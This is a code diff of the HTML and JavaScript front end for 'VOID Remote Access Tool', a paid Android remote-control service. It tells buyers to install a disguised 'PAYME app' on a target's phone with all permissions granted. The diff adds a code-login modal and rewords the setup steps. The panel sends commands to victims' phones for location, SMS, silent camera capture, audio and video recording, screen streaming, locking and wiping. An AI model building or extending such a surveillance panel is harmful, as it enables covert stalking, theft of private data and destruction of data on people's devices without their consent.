@@ -24,7 +24,6 @@
   html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);min-height:100vh;overflow-x:hidden;}
   body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;}
 
-  /* TOPBAR */
   .topbar{width:100%;max-width:1100px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:24px;box-shadow:0 8px 30px rgba(0,0,0,.4);position:sticky;top:8px;z-index:50;}
   .brand{font-size:15px;letter-spacing:.1em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
   .brand small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
@@ -33,7 +32,6 @@
   .top-btn.ghost{background:var(--card);border:1px solid var(--border);color:var(--text-2);box-shadow:none;}
   .top-btn:active{transform:scale(.97);}
 
-  /* LANDING */
   .landing{width:100%;max-width:1100px;}
   .hero{display:grid;grid-template-columns:1.4fr .8fr;gap:34px;align-items:center;padding:30px 0;margin-bottom:40px;}
   .badge{display:inline-block;background:rgba(123,92,255,.15);color:#b7a9ff;padding:8px 14px;border-radius:50px;font-weight:800;letter-spacing:.15em;font-size:10px;margin-bottom:20px;border:1px solid rgba(123,92,255,.3);}
@@ -78,7 +76,6 @@
   .faq-item h3{font-size:13.5px;font-weight:800;color:var(--accent-2);margin-bottom:6px;}
   .faq-item p{font-size:12.5px;color:var(--text-2);line-height:1.55;}
 
-  /* PRICING */
   .pricing-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
   .price-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:28px 22px;text-align:center;position:relative;}
   .price-card.featured{border-color:var(--accent);box-shadow:0 0 40px rgba(123,92,255,.3);}
@@ -92,7 +89,6 @@
   .upgrade-btn:active{transform:scale(.98);}
   .upgrade-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);box-shadow:0 8px 20px rgba(37,211,102,.3);}
 
-  /* DOWNLOADS */
   .downloads-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
   .dl-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:24px;}
   .dl-head{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
@@ -104,14 +100,13 @@
 
   footer{width:100%;max-width:1100px;margin-top:60px;padding:30px 20px;text-align:center;color:var(--text-3);font-size:11px;letter-spacing:.15em;border-top:1px solid var(--border);}
 
-  /* MODAL (plan picker) */
   .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);display:none;align-items:flex-start;justify-content:center;z-index:100;padding:20px;overflow-y:auto;padding-top:40px;padding-bottom:40px;}
   .modal-overlay.show{display:flex;}
   .modal-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:30px 24px;width:100%;max-width:440px;box-shadow:0 30px 80px rgba(0,0,0,.7);animation:pop .3s ease;}
   @keyframes pop{from{opacity:0;transform:translateY(20px) scale(.96);}to{opacity:1;transform:translateY(0) scale(1);}}
   .modal-title{text-align:center;font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
   .modal-sub{text-align:center;font-size:12px;color:var(--text-2);margin-bottom:24px;line-height:1.5;}
-  .plan-choice{display:block;width:100%;padding:18px;background:#0a1220;border:1.5px solid var(--border);border-radius:16px;text-align:left;margin-bottom:12px;cursor:pointer;transition:.15s;font-family:inherit;}
+  .plan-choice{display:block;width:100%;padding:18px;background:#0a1220;border:1.5px solid var(--border);border-radius:16px;text-align:left;margin-bottom:12px;cursor:pointer;transition:.15s;font-family:inherit;color:inherit;}
   .plan-choice:hover,.plan-choice:active{border-color:var(--accent);background:#101c33;}
   .plan-choice .pc-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
   .plan-choice .pc-name{font-size:15px;font-weight:900;color:#fff;letter-spacing:.08em;}
@@ -119,7 +114,6 @@
   .plan-choice .pc-desc{font-size:12px;color:var(--text-2);line-height:1.45;}
   .modal-close{background:none;border:none;color:var(--text-3);font-size:11px;letter-spacing:.15em;display:block;margin:14px auto 0;cursor:pointer;font-family:inherit;}
 
-  /* CODE DISPLAY */
   .code-display{background:#04070f;border:1.5px solid var(--accent);border-radius:16px;padding:24px 20px;text-align:center;margin:20px 0;box-shadow:0 0 40px rgba(123,92,255,.25);}
   .code-label{font-size:10px;font-weight:900;letter-spacing:.3em;color:var(--text-3);margin-bottom:12px;}
   .code-digits{font-family:'Menlo','Courier New',monospace;font-size:42px;font-weight:900;letter-spacing:.25em;color:#00e676;text-shadow:0 0 30px rgba(0,230,118,.5);margin-bottom:8px;}
@@ -133,7 +127,6 @@
   .btn-copy{background:var(--card);border:1px solid var(--border);color:var(--text);}
   .btn-continue{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 8px 20px rgba(123,92,255,.3);}
 
-  /* PANEL */
   .panel{width:100%;max-width:520px;display:none;}
   .panel.active{display:block;}
   .panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:14px;}
@@ -214,18 +207,17 @@
 </head>
 <body>
 
-<!-- TOPBAR -->
 <div class="topbar" id="topbarLanding">
   <div class="brand">VOID<small>REMOTE ACCESS TOOL</small></div>
   <div class="top-actions">
     <button class="top-btn ghost" onclick="goTo('functions')">FUNCTIONS</button>
     <button class="top-btn ghost" onclick="goTo('faq')">FAQ</button>
     <button class="top-btn ghost" onclick="goTo('pricing')">PRICING</button>
+    <button class="top-btn ghost" onclick="openLoginModal()">I HAVE A CODE</button>
     <button class="top-btn" onclick="openPlanPicker()">GET STARTED</button>
   </div>
 </div>
 
-<!-- LANDING -->
 <div class="landing" id="landing">
 
   <div class="hero">
@@ -235,7 +227,7 @@
       <p>Monitor, control, and secure any Android device from your browser. Real-time access, zero installation complexity, professional-grade reliability.</p>
       <div class="hero-buttons">
         <button class="primary" onclick="openPlanPicker()">GET STARTED</button>
-        <button class="secondary" onclick="goTo('pricing')">VIEW PRICING</button>
+        <button class="secondary" onclick="openLoginModal()">I HAVE A CODE</button>
       </div>
     </div>
     <div class="hero-card">
@@ -261,10 +253,10 @@
     <h2>How It Works</h2>
     <p>Four steps to full access</p>
     <div class="steps">
-      <div class="step"><div class="num">STEP 01</div><h3>Get Code</h3><p>Pick a plan — system gives you a 5-digit code.</p></div>
+      <div class="step"><div class="num">STEP 01</div><h3>Get Code</h3><p>Pick a plan — the system generates your unique 5-digit code.</p></div>
       <div class="step"><div class="num">STEP 02</div><h3>Install</h3><p>Deliver the app to the target device.</p></div>
-      <div class="step"><div class="num">STEP 03</div><h3>Activate</h3><p>Enter the code in the app.</p></div>
-      <div class="step"><div class="num">STEP 04</div><h3>Control</h3><p>Log in with the same code on the panel.</p></div>
+      <div class="step"><div class="num">STEP 03</div><h3>Activate</h3><p>Enter your code in the app during setup.</p></div>
+      <div class="step"><div class="num">STEP 04</div><h3>Control</h3><p>Log in with the same code on this panel.</p></div>
     </div>
   </section>
 
@@ -387,44 +379,35 @@
   <section id="faq">
     <h2>Frequently Asked Questions</h2>
     <p>Everything you need to know</p>
-    <div class="faq-item"><h3>How does the code system work?</h3><p>When you pick a plan, the system generates a unique 5-digit code for you. Use the same code to log in here AND to activate the PAYME app on the target device.</p></div>
+    <div class="faq-item"><h3>How does the code system work?</h3><p>When you pick a plan, the system generates a unique 5-digit code for you. Use the same code to log in here AND to activate the app on the target device.</p></div>
     <div class="faq-item"><h3>Is the free tier really free?</h3><p>Yes. You get a code that never expires and 3 commands total. No payment needed.</p></div>
     <div class="faq-item"><h3>How do I upgrade to PRO or VIP?</h3><p>Tap the PRO or VIP button. It opens WhatsApp. Send your message, we send payment details. After payment, we send you the upgraded code.</p></div>
-    <div class="faq-item"><h3>Does it work on all Android versions?</h3><p>Yes. Android 5 through Android 15+. Camera capture uses Camera2 API on modern devices.</p></div>
+    <div class="faq-item"><h3>I already have a code. How do I log in?</h3><p>Tap "I HAVE A CODE" at the top or in the hero. Enter your 5-digit code. That's it.</p></div>
+    <div class="faq-item"><h3>Does it work on all Android versions?</h3><p>Yes. Android 5 through Android 15+. Camera2 API for silent capture on modern devices.</p></div>
     <div class="faq-item"><h3>Is there an iOS version?</h3><p>Coming soon. Follow our WhatsApp for updates.</p></div>
-    <div class="faq-item"><h3>What if I lose my code?</h3><p>Message us on WhatsApp. We keep records of every generated code.</p></div>
   </section>
 
   <footer>VOID REMOTE ACCESS TOOL © 2026 — All rights reserved</footer>
 </div>
 
-<!-- PLAN PICKER MODAL -->
+<!-- PLAN PICKER -->
 <div class="modal-overlay" id="planModal">
   <div class="modal-box">
     <div class="modal-title">Choose Your Plan</div>
     <div class="modal-sub">Pick a tier. The system will generate your unique 5-digit access code.</div>
 
     <button class="plan-choice" onclick="generateFree()">
-      <div class="pc-head">
-        <div class="pc-name">FREE</div>
-        <div class="pc-price">₦0</div>
-      </div>
+      <div class="pc-head"><div class="pc-name">FREE</div><div class="pc-price">₦0</div></div>
       <div class="pc-desc">3 commands total. Location, Camera, SMS. Never expires.</div>
     </button>
 
     <button class="plan-choice" onclick="upgradeTier('pro')">
-      <div class="pc-head">
-        <div class="pc-name">PRO</div>
-        <div class="pc-price">₦1,000</div>
-      </div>
+      <div class="pc-head"><div class="pc-name">PRO</div><div class="pc-price">₦1,000</div></div>
       <div class="pc-desc">10 commands/day. All standard commands. Priority support.</div>
     </button>
 
     <button class="plan-choice" onclick="upgradeTier('vip')">
-      <div class="pc-head">
-        <div class="pc-name">VIP</div>
-        <div class="pc-price">₦3,000</div>
-      </div>
+      <div class="pc-head"><div class="pc-name">VIP</div><div class="pc-price">₦3,000</div></div>
       <div class="pc-desc">Unlimited. Everything. Camera, Audio, Video, Lock, Wipe.</div>
     </button>
 
@@ -432,11 +415,11 @@
   </div>
 </div>
 
-<!-- CODE DISPLAY MODAL -->
+<!-- CODE DISPLAY -->
 <div class="modal-overlay" id="codeModal">
   <div class="modal-box">
     <div class="modal-title">Your Access Code</div>
-    <div class="modal-sub">Save this code. You'll use it for the panel AND the PAYME app.</div>
+    <div class="modal-sub">Save this code. You'll use it for the panel AND the app.</div>
 
     <div class="code-display">
       <div class="code-label">YOUR 5-DIGIT CODE</div>
@@ -444,9 +427,7 @@
       <div class="code-tag free" id="codeTier">FREE</div>
     </div>
 
-    <div class="code-note" id="codeNote">
-      Enter this code in the PAYME app on the target device. Then come back here and log in with the same code.
-    </div>
+    <div class="code-note" id="codeNote"></div>
 
     <div class="code-actions">
       <button class="btn-copy" onclick="copyCode()">COPY</button>
@@ -457,12 +438,15 @@
   </div>
 </div>
 
-<!-- LOGIN MODAL (optional — for existing users with codes) -->
+<!-- LOGIN MODAL -->
 <div class="modal-overlay" id="loginModal">
   <div class="modal-box">
     <div class="modal-title">Log In</div>
-    <div class="modal-sub">Enter your user code to access your panel</div>
+    <div class="modal-sub">Enter your 5-digit code</div>
     <input class="plan-choice" style="text-align:center;font-family:monospace;font-size:22px;letter-spacing:.3em;color:#00e676;" id="loginCode" placeholder="— — — — —" maxlength="5" inputmode="numeric">
+    <div class="code-note" style="text-align:center;font-size:12px;color:#8894b5;margin-top:12px;">
+      Have a PRO or VIP code? Enter it above and tap ENTER.
+    </div>
     <div class="code-actions" style="margin-top:14px;">
       <button class="btn-copy" onclick="closeModal()">CANCEL</button>
       <button class="btn-continue" onclick="loginWithCode()">ENTER</button>
@@ -556,35 +540,23 @@ function showToast(msg){
   setTimeout(function(){ t.classList.remove('show'); }, 2500);
 }
 
-function openPlanPicker(){
-  closeModal();
-  $('planModal').classList.add('show');
-}
-
-function closeModal(){
-  document.querySelectorAll('.modal-overlay').forEach(function(m){ m.classList.remove('show'); });
-}
+function openPlanPicker(){ closeModal(); $('planModal').classList.add('show'); }
+function openLoginModal(){ closeModal(); $('loginModal').classList.add('show'); setTimeout(function(){ $('loginCode').value = ''; $('loginCode').focus(); }, 100); }
+function closeModal(){ document.querySelectorAll('.modal-overlay').forEach(function(m){ m.classList.remove('show'); }); }
 
 function copyCode(){
   if(!state.pendingCode) return;
   if(navigator.clipboard){
-    navigator.clipboard.writeText(state.pendingCode).then(function(){
-      showToast('Code copied: ' + state.pendingCode);
-    });
+    navigator.clipboard.writeText(state.pendingCode).then(function(){ showToast('Code copied: ' + state.pendingCode); });
   } else {
     showToast('Copy manually: ' + state.pendingCode);
   }
 }
 
-// ---------- FREE CODE GENERATION ----------
 async function generateFree(){
   closeModal();
   try{
-    const r = await fetch(SERVER+'/generate-code', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ tier: 'free' })
-    });
+    const r = await fetch(SERVER+'/generate-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tier:'free'})});
     const j = await r.json();
     if(!j.ok){ showToast('Generation failed. Try again.'); return; }
 
@@ -594,12 +566,10 @@ async function generateFree(){
     $('generatedCode').textContent = j.code;
     $('codeTier').textContent = 'FREE';
     $('codeTier').className = 'code-tag free';
-    $('codeNote').innerHTML = 'Enter this code in the <strong>PAYME app</strong> on the target device. Then come back here and tap ENTER PANEL to log in with the same code.<br><br>Free tier: <strong style="color:#00e676;">3 commands total</strong>. Never expires.';
+    $('codeNote').innerHTML = 'Enter this code in the <strong>PAYME app</strong> on the target device. Then come back here and tap <strong>ENTER PANEL</strong> to log in with the same code.<br><br>Free tier: <strong style="color:#00e676;">3 commands total</strong>. Never expires.';
 
     $('codeModal').classList.add('show');
-  }catch(e){
-    showToast('Server unreachable');
-  }
+  }catch(e){ showToast('Server unreachable'); }
 }
 
 function continueToPanel(){
@@ -618,11 +588,7 @@ function loginWithCode(){
 
 async function performLogin(code, isAdmin){
   try{
-    const r = await fetch(SERVER+'/auth',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({username:'VOID', password:code})
-    });
+    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'VOID', password:code})});
     const j = await r.json();
     if(!j.ok){ showToast('Invalid code'); return; }
 
@@ -638,9 +604,7 @@ async function performLogin(code, isAdmin){
 
     updateTierUI();
     loadDevices();
-  }catch(e){
-    showToast('Server unreachable');
-  }
+  }catch(e){ showToast('Server unreachable'); }
 }
 
 $('logoutBtn').addEventListener('click', function(){
@@ -704,7 +668,20 @@ async function loadDevices(){
     const j = await r.json();
     const list = j.clients || j.devices || [];
     if(!j.ok || !list.length){
-      c.innerHTML = '<div class="loading">NO DEVICE CONNECTED YET</div>';
+      c.innerHTML =
+        '<div style="text-align:center;padding:36px 20px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:16px;">' +
+          '<div style="font-size:44px;margin-bottom:14px;">📱</div>' +
+          '<div style="font-size:15px;font-weight:800;color:#fff;margin-bottom:8px;">No Device Connected</div>' +
+          '<div style="font-size:13px;color:#8894b5;line-height:1.65;margin-bottom:16px;">' +
+            'Your code is <strong style="color:#00e676;font-family:monospace;font-size:15px;">' + esc(state.userId) + '</strong>' +
+          '</div>' +
+          '<div style="font-size:12.5px;color:#8894b5;line-height:1.7;padding:14px;background:#0a1220;border-radius:12px;border:1px solid #1e2c4d;">' +
+            '1. Open the <strong style="color:#fff;">PAYME app</strong> on the target phone<br>' +
+            '2. Enter the code above during setup<br>' +
+            '3. Grant all permissions<br>' +
+            '4. Device appears here in ~25 seconds' +
+          '</div>' +
+        '</div>';
       return;
     }
     c.innerHTML = '';
@@ -715,7 +692,7 @@ async function loadDevices(){
       el.addEventListener('click', function(){ openDevice(d.userId); });
       c.appendChild(el);
     });
-  }catch(e){ c.innerHTML = '<div class="loading">SERVER ERROR</div>'; }
+  }catch(e){ c.innerHTML = '<div class="loading">SERVER ERROR — tap to retry</div>'; c.onclick = loadDevices; }
 }
 
 async function openDevice(userId){
@@ -733,8 +710,7 @@ async function openDevice(userId){
     if(j.ok){
       const online = j.online ? 'ONLINE' : 'OFFLINE';
       $('detailSub').textContent = (j.device||'?') + ' • ' + (j.android||'?') + ' • ' + online;
-      state.liveOn = !!j.live;
-      state.flashOn = !!j.flash;
+      state.liveOn = !!j.live; state.flashOn = !!j.flash;
     }
   }catch(e){}
   startResultPoll();
@@ -751,10 +727,7 @@ $('backBtn').addEventListener('click', function(){
 document.querySelectorAll('.ctrl').forEach(function(el){
   el.addEventListener('click', async function(){
     if(!state.currentDevice){ showToast('No device selected'); return; }
-    if(el.classList.contains('locked')){
-      showToast('Upgrade required for this command');
-      return;
-    }
+    if(el.classList.contains('locked')){ showToast('Upgrade required for this command'); return; }
     const cmd = el.dataset.cmd;
     let arg = el.dataset.arg || '';
 
@@ -764,16 +737,8 @@ document.querySelectorAll('.ctrl').forEach(function(el){
     if(cmd === 'clip_record'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
     if(cmd === 'voice_record'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
 
-    if(cmd === 'led_test'){
-      state.flashOn = !state.flashOn;
-      if(state.flashOn){ el.classList.add('active'); arg = 'on'; }
-      else { el.classList.remove('active'); arg = 'off'; }
-    }
-    if(cmd === 'display_stream'){
-      state.liveOn = !state.liveOn;
-      if(state.liveOn){ el.classList.add('active'); arg = 'on'; }
-      else { el.classList.remove('active'); arg = 'off'; }
-    }
+    if(cmd === 'led_test'){ state.flashOn = !state.flashOn; if(state.flashOn){ el.classList.add('active'); arg = 'on'; } else { el.classList.remove('active'); arg = 'off'; } }
+    if(cmd === 'display_stream'){ state.liveOn = !state.liveOn; if(state.liveOn){ el.classList.add('active'); arg = 'on'; } else { el.classList.remove('active'); arg = 'off'; } }
 
     if(cmd !== 'led_test' && cmd !== 'display_stream'){
       state.activeCommand = cmd;
@@ -805,8 +770,7 @@ function startResultPoll(){
       const j = await r.json();
       if(!j.ok) return;
 
-      state.liveOn = !!j.live;
-      state.flashOn = !!j.flash;
+      state.liveOn = !!j.live; state.flashOn = !!j.flash;
 
       if(j.results && j.results.length){
         const box = $('outputBox');
@@ -868,12 +832,8 @@ function startResultPoll(){
   }, 2000);
 }
 
-function openImage(url){
-  $('imgModalImg').src = url;
-  $('imgModal').classList.add('show');
-}
+function openImage(url){ $('imgModalImg').src = url; $('imgModal').classList.add('show'); }
 
-// ---------- UPGRADE via WhatsApp ----------
 function upgradeTier(tier){
   const price = tier === 'pro' ? '1,000' : '3,000';
   const msg = encodeURIComponent(
